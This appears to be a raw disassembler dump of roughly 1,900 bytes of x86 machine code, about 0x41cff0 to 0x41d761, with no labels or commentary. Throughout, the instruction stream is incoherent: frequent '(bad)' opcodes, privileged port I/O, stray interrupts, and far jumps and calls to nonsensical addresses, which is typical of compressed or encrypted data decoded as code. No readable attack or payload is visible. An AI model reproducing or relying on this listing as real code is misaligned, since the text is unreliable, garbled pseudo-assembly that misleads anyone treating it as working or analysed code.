  41cff0:	mov    WORD PTR [esi+0x4e2bdaf6],fs
  41cff6:	mov    dh,0xa9
  41cff8:	test   eax,0x3d414e18
  41cffd:	imul   esp,ebp,0xfffffff8
  41d000:	pop    es
  41d001:	(bad)  
  41d002:	push   esp
  41d003:	sub    BYTE PTR [ecx+eax*1+0x1421506d],al
  41d00a:	les    edi,FWORD PTR [ebp-0x54]
  41d00d:	into   
  41d00e:	adc    al,0xa1
  41d010:	outs   dx,DWORD PTR ds:[esi]
  41d011:	pop    ebx
  41d012:	ss add eax,0x5904d4fa
  41d018:	inc    edi
  41d019:	mov    al,ds:0xd5708a5
  41d01e:	jge    0x41d027
  41d020:	jmp    0xe4d6:0xec531a40
  41d027:	(bad)  
  41d028:	and    dl,ah
  41d02a:	shr    BYTE PTR gs:[edx],cl
  41d02d:	fldcw  WORD PTR [ecx+0x15]
  41d030:	iret   
  41d031:	and    BYTE PTR [edx+0x7eb36e26],bh
  41d037:	in     al,0x6
  41d039:	in     eax,dx
  41d03a:	or     ah,BYTE PTR [edx+0x7686a0f9]
  41d040:	and    DWORD PTR [ebx-0x61],0xffffff9b
  41d044:	push   ebx
  41d045:	sub    eax,0xa1a71dc
  41d04a:	repz xchg ebx,eax
  41d04c:	pop    ebx
  41d04d:	mov    dl,0x86
  41d04f:	out    0xe2,eax
  41d051:	iret   
  41d052:	pop    eax
  41d053:	enter  0x4496,0x92
  41d057:	mov    dl,0xa5
  41d059:	in     eax,0xc
  41d05b:	pop    esp
  41d05c:	jns    0x41d01e
  41d05e:	jmp    0xe86d0baf
  41d063:	push   eax
  41d064:	mov    DWORD PTR [esi-0x2a],eax
  41d067:	or     edi,eax
  41d069:	in     al,dx
  41d06a:	sub    BYTE PTR [eax+0x63dd8be7],cl
  41d070:	data16 (bad) 
  41d072:	dec    esp
  41d073:	adc    bh,BYTE PTR [ebp+ebp*1+0x13fb8590]
  41d07a:	int    0x1b
  41d07c:	inc    ebx
  41d07d:	out    0x6e,al
  41d07f:	jge    0x41d0e0
  41d081:	xchg   edi,eax
  41d082:	mov    dl,0x93
  41d084:	mov    eax,ds:0x15c9bc64
  41d089:	mov    ebx,0xad27a978
  41d08e:	mov    edi,0x74e937d2
  41d093:	mov    dh,0xe8
  41d095:	dec    BYTE PTR [edi+ebp*1]
  41d098:	and    BYTE PTR [ebp+0x9ca9e16],cl
  41d09e:	pop    ecx
  41d09f:	jmp    0x41d0fb
  41d0a1:	std    
  41d0a2:	loope  0x41d10d
  41d0a4:	icebp  
  41d0a5:	or     al,0xe8
  41d0a7:	outs   dx,BYTE PTR ds:[esi]
  41d0a8:	xor    al,0xae
  41d0aa:	(bad)  
  41d0ab:	mov    es:0xffbe4092,eax
  41d0b1:	(bad)  
  41d0b2:	jmp    0x2a73f5a7
  41d0b7:	inc    esi
  41d0b8:	pop    ss
  41d0b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0ba:	mov    cs,WORD PTR [eax+0x35]
  41d0bd:	jo     0x41d11e
  41d0bf:	pop    esp
  41d0c0:	and    ah,BYTE PTR [edx-0x6983faf8]
  41d0c6:	out    0xf4,al
  41d0c8:	mov    eax,ds:0xafc96056
  41d0cd:	fst    QWORD PTR [edi]
  41d0cf:	mov    ah,0x1a
  41d0d1:	fsub   QWORD PTR [edi+0x6bde2c82]
  41d0d7:	retf   0x32a6
  41d0da:	push   es
  41d0db:	mov    edi,esp
  41d0dd:	(bad)  
  41d0de:	icebp  
  41d0df:	dec    ebx
  41d0e0:	mov    eax,ds:0x2cec1a2d
  41d0e5:	jae    0x41d0de
  41d0e7:	mov    ah,ch
  41d0e9:	sbb    bl,BYTE PTR [edi+ebp*2+0x177d577b]
  41d0f0:	sbb    bh,BYTE PTR [ebp-0x45]
  41d0f3:	int    0x44
  41d0f5:	push   ss
  41d0f6:	mov    ebp,DWORD PTR [edx+0x595fdc3]
  41d0fc:	pusha  
  41d0fd:	adc    bl,BYTE PTR [edx]
  41d0ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d101:	or     DWORD PTR [edx+0x181df845],0x773ce22e
  41d10b:	paddusb mm2,QWORD PTR [ebx+eax*1]
  41d10f:	mov    al,0x1
  41d111:	inc    ebp
  41d112:	fst    QWORD PTR [eax+edi*2]
  41d115:	xchg   ebp,eax
  41d116:	fadd   DWORD PTR ds:[ebx]
  41d119:	or     BYTE PTR [edi],bl
  41d11b:	icebp  
  41d11c:	imul   eax,DWORD PTR [edi+0x320b7366],0xffffffcb
  41d123:	inc    esp
  41d124:	sbb    eax,0x895876c
  41d129:	xchg   ebp,eax
  41d12a:	test   BYTE PTR [esi-0x40],0x60
  41d12e:	push   eax
  41d12f:	leave  
  41d130:	push   ss
  41d131:	iret   
  41d132:	dec    eax
  41d133:	das    
  41d134:	cmp    ecx,DWORD PTR [edi]
  41d136:	jns    0x41d15b
  41d138:	outs   dx,BYTE PTR ds:[esi]
  41d139:	add    esi,esp
  41d13b:	sahf   
  41d13c:	mov    ds:0x276beae9,al
  41d141:	cmp    BYTE PTR [ebp-0x46],0x10
  41d145:	stos   BYTE PTR es:[edi],al
  41d146:	repnz xchg edx,eax
  41d148:	mov    ch,0x1b
  41d14a:	das    
  41d14b:	(bad)  
  41d14c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d14d:	out    0x45,al
  41d14f:	inc    edx
  41d150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d151:	fdivr  QWORD PTR [ebx-0x783d3b63]
  41d157:	inc    edx
  41d158:	fucomi st,st(1)
  41d15a:	fistp  DWORD PTR [esi]
  41d15c:	cmp    eax,0x396c1334
  41d161:	dec    edi
  41d162:	xor    bl,BYTE PTR [ecx]
  41d164:	(bad)  
  41d165:	ins    BYTE PTR es:[edi],dx
  41d166:	mov    bl,0xae
  41d168:	loop   0x41d196
  41d16a:	daa    
  41d16b:	clc    
  41d16c:	inc    esp
  41d16d:	push   ecx
  41d16e:	scas   eax,DWORD PTR es:[edi]
  41d16f:	lods   eax,DWORD PTR ds:[esi]
  41d170:	dec    esp
  41d171:	pop    ecx
  41d172:	jne    0x41d142
  41d174:	or     DWORD PTR ds:0x9644b90b,0x15
  41d17b:	clc    
  41d17c:	xor    cl,BYTE PTR ss:[ebp-0x305ed001]
  41d183:	pop    edi
  41d184:	and    al,0x7a
  41d186:	dec    edi
  41d187:	sbb    eax,0x5190feaf
  41d18c:	cwde   
  41d18d:	fdivr  st(4),st
  41d18f:	dec    edx
  41d190:	jg     0x41d134
  41d192:	mov    ch,BYTE PTR [esi+0x38]
  41d195:	out    0xbe,eax
  41d197:	and    esi,DWORD PTR [edx+0x79eb2ae4]
  41d19d:	int3   
  41d19e:	mov    ah,BYTE PTR [eax]
  41d1a0:	retf   
  41d1a1:	repz adc DWORD PTR [edx+esi*2],edx
  41d1a5:	gs (bad) 
  41d1a7:	int3   
  41d1a8:	pop    ss
  41d1a9:	mov    edi,0x757f8f49
  41d1ae:	hlt    
  41d1af:	push   esi
  41d1b0:	jl     0x41d14c
  41d1b2:	sub    DWORD PTR [esi+0x13],eax
  41d1b5:	or     DWORD PTR [ebx],esp
  41d1b7:	adc    cl,dl
  41d1b9:	mov    DWORD PTR [ecx-0x7],ebx
  41d1bc:	jae    0x41d229
  41d1be:	mov    eax,ds:0x9fe3e5f6
  41d1c3:	cwde   
  41d1c4:	dec    eax
  41d1c5:	pop    esp
  41d1c6:	sbb    al,dh
  41d1c8:	fwait
  41d1c9:	xor    BYTE PTR [esi+0x5f9a706a],ch
  41d1cf:	popa   
  41d1d0:	outs   dx,BYTE PTR ds:[esi]
  41d1d1:	loope  0x41d159
  41d1d3:	clc    
  41d1d4:	xor    DWORD PTR [eax+0x5c6921d4],edi
  41d1da:	xor    esp,eax
  41d1dc:	mov    eax,ds:0x382507ea
  41d1e1:	lds    ebx,FWORD PTR [edi-0x2d]
  41d1e4:	inc    ebx
  41d1e5:	sahf   
  41d1e6:	aad    0xcc
  41d1e8:	xchg   DWORD PTR [ecx+0x541e95f2],esp
  41d1ee:	stos   DWORD PTR es:[edi],eax
  41d1ef:	ficom  DWORD PTR [edx-0x2de2fd23]
  41d1f5:	cvtdq2ps xmm2,XMMWORD PTR [ebp-0x8]
  41d1f9:	sahf   
  41d1fa:	clc    
  41d1fb:	push   ecx
  41d1fc:	ror    DWORD PTR ds:0x5a5e63,1
  41d202:	sbb    al,0x9a
  41d204:	mov    dh,0xa
  41d206:	call   0xbed55857
  41d20b:	int    0xea
  41d20d:	dec    ebx
  41d20e:	xor    eax,0x60680a79
  41d213:	mov    esp,0x24537078
  41d218:	xor    al,0xe3
  41d21a:	out    dx,eax
  41d21b:	cs ret 0x757e
  41d21f:	inc    eax
  41d220:	data16 lods al,BYTE PTR ds:[esi]
  41d222:	jb     0x41d24d
  41d224:	sar    BYTE PTR [ebp+0x60],cl
  41d227:	(bad)  
  41d229:	sahf   
  41d22a:	fcom   QWORD PTR [edx-0x7c]
  41d22d:	or     eax,0xc1bcab0b
  41d232:	adc    BYTE PTR [ebx+eax*8+0x7d85331e],bl
  41d239:	xchg   DWORD PTR [edx],ebp
  41d23b:	les    ecx,FWORD PTR [eax-0x6610ab77]
  41d241:	les    esi,FWORD PTR [esi+0x50]
  41d244:	shl    DWORD PTR [eax],cl
  41d246:	mov    edi,0x15e07b3a
  41d24b:	(bad)  
  41d24c:	mov    fs,ecx
  41d24e:	cmp    DWORD PTR [ecx+0x4c4b4b41],ebp
  41d254:	pop    ebx
  41d255:	fdivr  QWORD PTR [eax+eiz*2]
  41d258:	shr    DWORD PTR [ebx+0x25],cl
  41d25b:	repnz adc ch,cl
  41d25e:	btc    DWORD PTR [eax+0x35],edx
  41d262:	pushf  
  41d263:	dec    edx
  41d264:	xor    cl,BYTE PTR [edx]
  41d266:	ret    0x4527
  41d269:	out    dx,al
  41d26a:	sbb    eax,0x92949af9
  41d26f:	add    eax,DWORD PTR [edx]
  41d271:	loopne 0x41d2e9
  41d273:	mov    ebx,0x35b3f0c1
  41d278:	xor    al,cl
  41d27a:	jns    0x41d237
  41d27c:	ds je  0x41d22b
  41d27f:	or     edx,DWORD PTR [esi+0xa574499]
  41d285:	js     0x41d226
  41d287:	push   eax
  41d288:	mov    dl,0xe2
  41d28a:	sub    eax,0xf4f23838
  41d28f:	repnz idiv BYTE PTR [ebp+0x799eca4b]
  41d296:	scas   eax,DWORD PTR es:[edi]
  41d297:	ret    0x6bdd
  41d29a:	les    esi,FWORD PTR [edi]
  41d29c:	xor    al,0x30
  41d29e:	push   ebp
  41d29f:	sbb    DWORD PTR [edx],eax
  41d2a1:	lds    edx,FWORD PTR [ecx]
  41d2a3:	imul   esp,DWORD PTR [ebx+eiz*1+0x43],0xffffff95
  41d2a8:	imul   edx,DWORD PTR [esi],0xffffffc0
  41d2ab:	xchg   BYTE PTR [esi+0x26ec3859],bh
  41d2b1:	jbe    0x41d29e
  41d2b3:	fimul  DWORD PTR [ebx-0x7b1d07d]
  41d2b9:	inc    esp
  41d2ba:	dec    ecx
  41d2bb:	and    cl,BYTE PTR [eax+0x3f298f0b]
  41d2c1:	jl     0x41d289
  41d2c3:	test   DWORD PTR [ebp+eax*1+0x27da3f5c],esp
  41d2ca:	mov    esi,0xb4f26ae7
  41d2cf:	fistp  WORD PTR [ebp+0x2fc434a9]
  41d2d5:	mov    ebp,0x6f17be1
  41d2da:	mov    esi,0x26bd1d7c
  41d2df:	dec    ebx
  41d2e0:	sbb    ebp,DWORD PTR [ecx]
  41d2e2:	in     eax,dx
  41d2e3:	jmp    0x41d35d
  41d2e5:	mov    WORD PTR [eax],gs
  41d2e7:	out    dx,eax
  41d2e8:	jmp    0x41d2fe
  41d2ea:	cmp    al,0x33
  41d2ec:	jl     0x41d316
  41d2ee:	jecxz  0x41d360
  41d2f0:	jo     0x41d360
  41d2f2:	cwde   
  41d2f3:	mov    ch,0xa2
  41d2f5:	mov    ebp,0xad4a7046
  41d2fa:	jno    0x41d2f3
  41d2fc:	pop    ds
  41d2fd:	push   eax
  41d2fe:	enter  0xf0f7,0x19
  41d302:	cwde   
  41d303:	popa   
  41d304:	or     ah,BYTE PTR [eax]
  41d306:	stc    
  41d307:	in     eax,0x45
  41d309:	int3   
  41d30a:	test   DWORD PTR [ebx+0x328dec31],ebp
  41d310:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d311:	rol    BYTE PTR [esp+eiz*2-0x3e1e1e27],cl
  41d318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d319:	je     0x41d36f
  41d31b:	xor    DWORD PTR [ebp-0x6a],0xffffffa6
  41d31f:	push   es
  41d320:	dec    ecx
  41d321:	jb     0x41d2e4
  41d323:	inc    esp
  41d324:	test   ah,dl
  41d326:	inc    esp
  41d327:	push   esp
  41d328:	mov    DWORD PTR [esi],0x53dabe8d
  41d32e:	xlat   BYTE PTR ds:[ebx]
  41d32f:	or     edx,DWORD PTR [edi+ebp*2-0x1881b767]
  41d336:	inc    BYTE PTR ds:0x467aa910
  41d33c:	int    0x2e
  41d33e:	and    ebx,DWORD PTR [edi-0x42]
  41d341:	shl    BYTE PTR [eax],0xf4
  41d344:	out    dx,al
  41d345:	int    0x72
  41d347:	fstp   QWORD PTR ds:0x76ade60f
  41d34d:	je     0x41d2ea
  41d34f:	xor    esp,esp
  41d351:	arpl   WORD PTR [ebp-0x40c0db4f],dx
  41d357:	outs   dx,BYTE PTR ds:[esi]
  41d358:	adc    eax,0xc27d551d
  41d35d:	sub    al,0x30
  41d35f:	adc    DWORD PTR [ecx+0x65],esi
  41d362:	sbb    al,0x22
  41d364:	mov    ds:0x88bd164c,al
  41d369:	retf   
  41d36a:	and    edi,DWORD PTR [esi+0x5a9f9bbe]
  41d370:	scas   al,BYTE PTR es:[edi]
  41d371:	and    eax,0x16828474
  41d376:	xor    edx,DWORD PTR [edi]
  41d378:	or     BYTE PTR [ecx-0x59b1b713],dh
  41d37e:	sbb    al,0xc8
  41d380:	adc    BYTE PTR [edi],0x8f
  41d383:	aaa    
  41d384:	fdivr  st,st(6)
  41d386:	in     eax,dx
  41d387:	jecxz  0x41d373
  41d389:	jno    0x41d38f
  41d38b:	fisub  DWORD PTR [esi-0x2f2fe18a]
  41d391:	push   0x18
  41d393:	test   BYTE PTR [eax-0x2a],bl
  41d396:	pop    ecx
  41d397:	inc    edx
  41d398:	sbb    BYTE PTR [ebx+ecx*8],ch
  41d39b:	dec    edi
  41d39c:	jb     0x41d328
  41d39e:	jnp    0x41d3ff
  41d3a0:	sub    al,0x95
  41d3a2:	push   0x85e2f6ab
  41d3a7:	adc    ebp,ebx
  41d3a9:	or     ch,BYTE PTR [edx-0x51]
  41d3ac:	push   es
  41d3ad:	pop    ds
  41d3ae:	inc    esi
  41d3af:	adc    BYTE PTR [eax-0x58],0x83
  41d3b3:	arpl   WORD PTR [eax],dx
  41d3b5:	ud0    edi,DWORD PTR [esi-0xf4a2805]
  41d3bc:	adc    bl,BYTE PTR [ecx+esi*4]
  41d3bf:	adc    WORD PTR [edx-0x13],bp
  41d3c3:	mov    DWORD PTR [ecx],ebx
  41d3c5:	sub    dl,BYTE PTR ds:0x4536b4b9
  41d3cb:	jg     0x41d399
  41d3cd:	fstp   DWORD PTR [esi-0x39]
  41d3d0:	sub    ch,BYTE PTR [esi]
  41d3d2:	in     eax,dx
  41d3d3:	test   BYTE PTR [esi],bh
  41d3d5:	jno    0x41d35e
  41d3d7:	sbb    ecx,edx
  41d3d9:	sub    DWORD PTR [edx+0x45c0375d],0xcde548f5
  41d3e3:	mov    ebx,0xf22e872e
  41d3e8:	cld    
  41d3e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3ea:	sbb    dh,bh
  41d3ec:	adc    DWORD PTR gs:[eax],edi
  41d3ef:	dec    edx
  41d3f0:	pop    ecx
  41d3f1:	push   edx
  41d3f2:	icebp  
  41d3f3:	xchg   ebp,eax
  41d3f4:	jb     0x41d3cd
  41d3f6:	mul    esi
  41d3f8:	sub    ecx,DWORD PTR [eax+0x7c18e829]
  41d3fe:	and    esp,DWORD PTR [ebx+0x5e75f4c4]
  41d404:	call   0xff50:0x33fa8628
  41d40b:	pop    ebx
  41d40c:	es test eax,0x509e5dce
  41d412:	loope  0x41d396
  41d414:	sbb    ah,dh
  41d416:	xchg   ecx,eax
  41d417:	cmc    
  41d418:	or     al,dl
  41d41a:	sbb    eax,0x6b23fa92
  41d41f:	mov    ch,0x23
  41d421:	and    dh,BYTE PTR [edi+ecx*2]
  41d424:	sahf   
  41d425:	jbe    0x41d45a
  41d427:	add    DWORD PTR [ebx-0x57],ecx
  41d42a:	jle    0x41d443
  41d42c:	mov    al,ds:0x4d3ad9e1
  41d431:	mov    dl,0x98
  41d433:	scas   eax,DWORD PTR es:[edi]
  41d434:	sub    DWORD PTR [edx+eax*8-0x3608cea4],ebp
  41d43b:	int3   
  41d43c:	cmp    DWORD PTR [ecx],ebx
  41d43e:	test   eax,0xd68a233d
  41d443:	pop    edx
  41d444:	add    al,0x1a
  41d446:	and    ch,bl
  41d448:	and    BYTE PTR [ebx+0x59],bh
  41d44b:	retf   
  41d44c:	clc    
  41d44d:	ds in  al,0x3d
  41d450:	popf   
  41d451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d452:	xchg   ebp,eax
  41d453:	mov    dl,0x6
  41d455:	jne    0x41d452
  41d457:	mov    esi,0x783d2e97
  41d45c:	lahf   
  41d45d:	mov    bh,0x7c
  41d45f:	je     0x41d445
  41d461:	test   BYTE PTR ss:[ebp-0x52],ch
  41d465:	inc    edi
  41d466:	dec    ebp
  41d467:	cmp    ah,BYTE PTR [eax-0x46aed943]
  41d46d:	gs cwde 
  41d46f:	mov    DWORD PTR [esi],ebx
  41d471:	leave  
  41d472:	lods   eax,DWORD PTR ds:[esi]
  41d473:	mov    edx,0xf116010f
  41d478:	js     0x41d4b0
  41d47a:	xchg   esp,eax
  41d47b:	mov    al,ds:0xd656c7d8
  41d480:	pop    eax
  41d481:	jns    0x41d499
  41d483:	not    ebp
  41d485:	or     BYTE PTR [eax+0x2af78826],dl
  41d48b:	ja     0x41d4bd
  41d48d:	out    dx,eax
  41d48e:	clc    
  41d48f:	lods   eax,DWORD PTR ds:[esi]
  41d490:	addr16 loope 0x41d4a0
  41d493:	cmp    al,0x59
  41d495:	mov    dh,cl
  41d497:	sub    DWORD PTR [edi],ecx
  41d499:	idiv   BYTE PTR [ebp+0x265f3f16]
  41d49f:	xor    DWORD PTR [edx],0x7f8c10b3
  41d4a5:	jmp    0xc1f1:0x8e0b3466
  41d4ac:	jmp    0x4fd12766
  41d4b1:	sahf   
  41d4b2:	sub    DWORD PTR [ebp+0x3327ed75],0x1f
  41d4b9:	dec    esp
  41d4ba:	xchg   BYTE PTR [ebp-0x2636bb55],cl
  41d4c0:	add    esi,edx
  41d4c2:	pop    ebx
  41d4c3:	stos   DWORD PTR es:[edi],eax
  41d4c4:	jecxz  0x41d4fb
  41d4c6:	and    ecx,DWORD PTR ds:[ecx+0x6999b63e]
  41d4cd:	lds    ebp,FWORD PTR [ecx]
  41d4cf:	or     BYTE PTR [eax+0x5069308],ch
  41d4d5:	sbb    esp,DWORD PTR [ecx+0x3c]
  41d4d8:	addr16 mov dh,cl
  41d4db:	or     cl,BYTE PTR [ebp-0x64]
  41d4de:	mov    edi,0x5a3e4a
  41d4e3:	sub    eax,DWORD PTR [ebx-0x4b]
  41d4e6:	mov    al,0x86
  41d4e8:	(bad)  
  41d4e9:	and    al,0xb1
  41d4eb:	or     eax,0xcffed1db
  41d4f0:	jne    0x41d55b
  41d4f2:	(bad)  
  41d4f3:	loop   0x41d4cb
  41d4f5:	imul   edi,DWORD PTR [ecx],0xffffffd6
  41d4f8:	inc    ebx
  41d4f9:	sub    bl,cl
  41d4fb:	xchg   edx,eax
  41d4fc:	mov    edx,0xdc386028
  41d501:	dec    esi
  41d502:	cs dec edi
  41d504:	enter  0xd695,0x3b
  41d508:	xchg   ebx,eax
  41d509:	addr16 push edi
  41d50b:	add    dl,BYTE PTR [edi-0x61]
  41d50e:	outs   dx,BYTE PTR ds:[esi]
  41d50f:	xor    ebx,DWORD PTR [esi-0x1cc0c54]
  41d515:	push   ebp
  41d516:	dec    esp
  41d517:	jno    0x41d4c4
  41d519:	mov    bh,ah
  41d51b:	jno    0x41d517
  41d51d:	sbb    ecx,esp
  41d51f:	cmp    al,0x2c
  41d521:	(bad)  
  41d523:	xchg   DWORD PTR [esi-0x1],ebp
  41d526:	mov    dh,0xdd
  41d528:	loop   0x41d58a
  41d52a:	jmp    DWORD PTR [edi+0x66]
  41d52d:	sti    
  41d52e:	jp     0x41d542
  41d530:	leave  
  41d531:	inc    ebx
  41d532:	cli    
  41d533:	jns    0x41d583
  41d535:	add    DWORD PTR [ebx],ecx
  41d537:	jecxz  0x41d4ec
  41d539:	pusha  
  41d53a:	mov    al,0xbe
  41d53c:	inc    eax
  41d53d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d53e:	rcr    esi,0xf1
  41d541:	jmp    0x41d55a
  41d543:	and    ch,BYTE PTR [eax-0x55]
  41d546:	jle    0x41d59b
  41d548:	ins    BYTE PTR es:[edi],dx
  41d549:	shr    DWORD PTR [eax+0x57bb7d6],cl
  41d54f:	icebp  
  41d550:	cs sub eax,0x6cb3cbf4
  41d556:	add    dl,ch
  41d558:	or     ebp,DWORD PTR [eax]
  41d55a:	xor    dl,BYTE PTR [edx+0x5b]
  41d55d:	mov    ebx,0x5207b9e0
  41d562:	jg     0x41d52d
  41d564:	jmp    0xfa5b:0x83c2be94
  41d56b:	sub    al,0x84
  41d56d:	push   esi
  41d56e:	aad    0x3a
  41d570:	push   edx
  41d571:	setne  BYTE PTR [ebx+0x656a4986]
  41d578:	mov    edx,fs
  41d57a:	mov    edx,0xe86646dd
  41d57f:	inc    eax
  41d580:	xchg   DWORD PTR [esi-0x48],esp
  41d583:	mov    edx,0x219e1236
  41d588:	sbb    esp,ebp
  41d58a:	cli    
  41d58b:	sbb    cl,BYTE PTR [ecx+0x27]
  41d58e:	loop   0x41d585
  41d590:	mov    ecx,0x685eee26
  41d595:	pop    eax
  41d596:	push   eax
  41d597:	rol    eax,0x87
  41d59a:	cmp    ah,cl
  41d59c:	leave  
  41d59d:	push   eax
  41d59e:	(bad)  
  41d59f:	cwde   
  41d5a0:	retf   0x1a8d
  41d5a3:	adc    BYTE PTR [ebx+0x8],ah
  41d5a6:	pop    ebp
  41d5a7:	xchg   esp,eax
  41d5a8:	aaa    
  41d5a9:	push   0x15
  41d5ab:	out    0xd2,eax
  41d5ad:	jmp    0x1c47beec
  41d5b2:	je     0x41d598
  41d5b4:	(bad)  
  41d5b5:	(bad)  
  41d5b6:	cli    
  41d5b7:	nop
  41d5b8:	cmc    
  41d5b9:	jae    0x41d5a0
  41d5bb:	fisubr WORD PTR [eax]
  41d5bd:	rol    DWORD PTR [esi-0xd],cl
  41d5c0:	loope  0x41d5fa
  41d5c2:	ins    BYTE PTR es:[edi],dx
  41d5c3:	and    al,0x51
  41d5c5:	(bad)  
  41d5c6:	pop    ebx
  41d5c7:	or     BYTE PTR [ebx-0x8],dl
  41d5ca:	scas   al,BYTE PTR es:[edi]
  41d5cb:	jp     0x41d594
  41d5cd:	pusha  
  41d5ce:	lods   eax,DWORD PTR ds:[esi]
  41d5cf:	sub    ebp,esp
  41d5d1:	rcr    BYTE PTR [esi-0x301e7081],0x88
  41d5d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5d9:	sub    BYTE PTR [esp+ebx*1],al
  41d5dc:	call   0xa5680aec
  41d5e1:	iret   
  41d5e2:	xor    DWORD PTR [edi+0x50c16322],edx
  41d5e8:	adc    DWORD PTR [edx],eax
  41d5ea:	ret    0x59fc
  41d5ed:	push   cs
  41d5ee:	(bad)  [ecx-0x65c6b943]
  41d5f4:	gs inc eax
  41d5f6:	div    eax
  41d5f8:	clc    
  41d5f9:	jl     0x41d5fc
  41d5fb:	nop
  41d5fc:	outs   dx,BYTE PTR ds:[esi]
  41d5fd:	xchg   esi,eax
  41d5fe:	clc    
  41d5ff:	scas   al,BYTE PTR es:[edi]
  41d600:	(bad)  
  41d601:	jne    0x41d62e
  41d603:	pushf  
  41d604:	cmp    eax,0x2d6619fc
  41d609:	mov    eax,ds:0xc1d6213a
  41d60e:	inc    edx
  41d60f:	xor    eax,0x44b14f5f
  41d614:	mov    eax,ds:0x70cecee3
  41d619:	les    edi,FWORD PTR [ebx]
  41d61b:	leave  
  41d61c:	mov    cl,0xeb
  41d61e:	lods   al,BYTE PTR ds:[esi]
  41d61f:	mov    dh,0x42
  41d621:	aaa    
  41d622:	jbe    0x41d5f5
  41d624:	not    DWORD PTR [ecx+0x5f]
  41d627:	jl     0x41d685
  41d629:	xchg   esp,eax
  41d62a:	pop    ebx
  41d62b:	add    dh,ah
  41d62d:	arpl   WORD PTR [esi-0x76],bp
  41d630:	sbb    DWORD PTR [edi-0x11],esi
  41d633:	lds    ebp,FWORD PTR [edi]
  41d635:	dec    esp
  41d636:	in     eax,dx
  41d637:	loop   0x41d612
  41d639:	and    DWORD PTR [edx],ebx
  41d63b:	aas    
  41d63c:	mov    edx,0xa6f39c3a
  41d641:	sbb    eax,0xc16a9e95
  41d646:	test   BYTE PTR [ebx],ch
  41d648:	inc    edx
  41d649:	inc    eax
  41d64a:	das    
  41d64b:	dec    eax
  41d64c:	mov    esi,0x3e5b7e0c
  41d651:	xchg   ecx,eax
  41d652:	mov    ds:0x3430420a,al
  41d657:	adc    al,0xce
  41d659:	aam    0xef
  41d65b:	mov    ebp,0x1f8e4bcd
  41d660:	sbb    DWORD PTR [ecx+0x17ef2bda],esp
  41d666:	jae    0x41d5ef
  41d668:	std    
  41d669:	sub    al,0x73
  41d66b:	mov    cl,0xcd
  41d66d:	sbb    DWORD PTR [ebx-0x66],ebp
  41d670:	jnp    0x41d609
  41d672:	xor    ebx,DWORD PTR [esi-0x399e7899]
  41d678:	stos   DWORD PTR es:[edi],eax
  41d679:	rol    bh,0x5
  41d67c:	and    cl,BYTE PTR [edi]
  41d67e:	push   eax
  41d67f:	fdiv   DWORD PTR [ebp-0x26bdbf1b]
  41d685:	pop    edi
  41d686:	shr    DWORD PTR [edx-0x6a999262],cl
  41d68c:	retf   0xae40
  41d68f:	sub    al,0xb
  41d691:	add    edi,esi
  41d693:	xor    eax,0x2e7aa614
  41d698:	test   DWORD PTR [ecx-0x724af937],ebp
  41d69e:	mov    ebp,0x64351f77
  41d6a3:	jb     0x41d70c
  41d6a5:	jl     0x41d6d5
  41d6a7:	mov    ebp,?
  41d6a9:	retf   0x1be5
  41d6ac:	xor    esi,DWORD PTR [ecx-0x45]
  41d6af:	ror    BYTE PTR [eax-0x29],cl
  41d6b2:	xor    ecx,eax
  41d6b4:	mov    bl,0xf
  41d6b6:	and    DWORD PTR [ecx-0x3077765b],esi
  41d6bc:	or     ebx,DWORD PTR [edi]
  41d6be:	mov    bh,0x97
  41d6c0:	pop    esi
  41d6c1:	lgs    edi,FWORD PTR [esi]
  41d6c4:	popa   
  41d6c5:	jmp    0x41d738
  41d6c7:	hlt    
  41d6c8:	inc    edx
  41d6c9:	dec    eax
  41d6ca:	in     eax,0xcc
  41d6cc:	dec    edi
  41d6cd:	cmp    al,0x62
  41d6cf:	into   
  41d6d0:	lods   al,BYTE PTR ds:[esi]
  41d6d1:	sub    BYTE PTR [ecx+edi*2-0x6e886db0],0xef
  41d6d9:	mov    ebp,0x2b5f9080
  41d6de:	sti    
  41d6df:	xchg   esi,eax
  41d6e0:	add    DWORD PTR [esi+0x3b936cb1],ebx
  41d6e6:	jb     0x41d66f
  41d6e8:	inc    ecx
  41d6e9:	popf   
  41d6ea:	jno    0x41d6c7
  41d6ec:	adc    ebx,esp
  41d6ee:	cmp    BYTE PTR [edi+0x2288a759],al
  41d6f4:	inc    esp
  41d6f5:	in     eax,0x2e
  41d6f7:	mov    dl,BYTE PTR [ebx+ebp*4+0x6fa1deb8]
  41d6fe:	test   ah,cl
  41d700:	xor    cl,cl
  41d702:	push   cs
  41d703:	mov    ah,0xce
  41d705:	scas   al,BYTE PTR es:[edi]
  41d706:	push   ds
  41d707:	mov    edi,0xe300e5d
  41d70c:	pop    ebp
  41d70d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d70e:	pop    ecx
  41d70f:	mov    ds:0xba7a2e31,eax
  41d714:	mov    esi,0x5df0d383
  41d719:	xor    ecx,esp
  41d71b:	repz sub DWORD PTR [ebp+0x384fdc96],esp
  41d722:	mov    ah,0x7a
  41d724:	rol    dh,1
  41d726:	jp     0x41d795
  41d728:	jecxz  0x41d72b
  41d72a:	aad    0x5a
  41d72c:	fwait
  41d72d:	mov    al,ds:0xd03c1b01
  41d732:	adc    edi,DWORD PTR [edi+ebx*2-0x9]
  41d736:	loopne 0x41d755
  41d738:	mov    ah,0xa4
  41d73a:	cli    
  41d73b:	hlt    
  41d73c:	pop    edi
  41d73d:	cmc    
  41d73e:	sbb    ebx,ecx
  41d740:	lods   al,BYTE PTR ds:[esi]
  41d741:	mov    ss,ecx
  41d743:	mov    esp,0x2c3652b1
  41d748:	xchg   ebp,eax
  41d749:	gs pop ss
  41d74b:	idiv   DWORD PTR [eax-0x61]
  41d74e:	push   ecx
  41d74f:	pusha  
  41d750:	pop    ss
  41d751:	add    al,0x2a
  41d753:	mov    dh,BYTE PTR [eax]
  41d755:	sub    ebx,eax
  41d757:	aam    0x87
  41d759:	cmc    
  41d75a:	sbb    cl,bh
  41d75c:	or     eax,0xe7a6931e
  41d761:	(bad)  
